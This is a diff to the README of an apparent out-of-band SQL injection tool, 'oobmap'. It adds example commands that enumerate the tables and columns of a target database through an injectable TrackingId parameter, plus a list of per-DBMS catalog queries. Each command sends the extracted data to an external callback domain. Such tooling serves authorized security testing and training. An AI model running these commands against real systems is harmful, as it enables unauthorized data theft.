@@ -198,6 +198,22 @@ oobmap enum -r req.txt -p TrackingId --dbms mssql \
   --banner --current-user --current-db
 ```
 
+Enumerate tables:
+
+```bash
+oobmap enum -r req.txt -p TrackingId --dbms mssql \
+  --domain abc123.oast.site --log interactsh.jsonl \
+  --tables --limit 20
+```
+
+Enumerate columns for one table:
+
+```bash
+oobmap enum -r req.txt -p TrackingId --dbms mssql \
+  --domain abc123.oast.site --log interactsh.jsonl \
+  --columns -T users --limit 20
+```
+
 Use table/column syntax:
 
 ```bash
@@ -301,6 +317,14 @@ Current profiles:
 Profiles are explicit on purpose. OOB exploitation depends heavily on the DBMS,
 available privileges, network egress, and stacked-query support.
 
+Metadata enumeration uses DBMS-specific catalog queries:
+
+- MSSQL: `INFORMATION_SCHEMA.TABLES`, `INFORMATION_SCHEMA.COLUMNS`
+- MySQL: `information_schema.tables`, `information_schema.columns`
+- PostgreSQL: `information_schema.tables`, `information_schema.columns`
+- Oracle: `all_tables`, `all_tab_columns`
+- SQLite training profile: `sqlite_master` for table names
+
 ## How Extraction Works
 
 For every character position, `oobmap` sends the whole alphabet in a batch.
@@ -382,13 +406,14 @@ Implemented:
 - scalar extraction with `extract`;
 - `dump` helper for one table/column expression;
 - metadata extraction with `enum --banner --current-user --current-db`;
+- table and column enumeration with `enum --tables` and `enum --columns -T <table>`;
 - automatic resume with `session.sqlite`;
 - `--output-dir`, `--flush-session`, `--fresh-queries`;
 - `--force-ssl`, `--batch`, `--risk`, and `--verbose` style options.
 
 Not implemented yet:
 
-- full `--dbs`, `--tables`, and `--columns` enumeration;
+- full `--dbs` enumeration and multi-schema selection;
 - WAF bypass/tamper scripts;
 - DBMS fingerprinting;
 - boolean/time/error/UNION exploitation;
